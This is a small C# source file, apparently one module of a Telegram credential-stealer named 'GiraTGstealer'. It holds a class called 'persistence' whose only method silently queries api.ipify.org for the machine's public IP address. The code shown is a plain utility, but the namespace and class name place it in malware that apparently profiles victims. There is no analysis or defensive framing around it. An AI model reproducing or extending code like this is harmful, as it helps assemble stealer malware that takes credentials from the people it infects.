using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GiraTGstealer
{
    internal class persistence
    {
        public static string getPublicIp()
        {
            try
            {
                return new System.Net.WebClient().DownloadString("https://api.ipify.org");
            }
            catch
            {
                return "";
            }
        }
    }
}
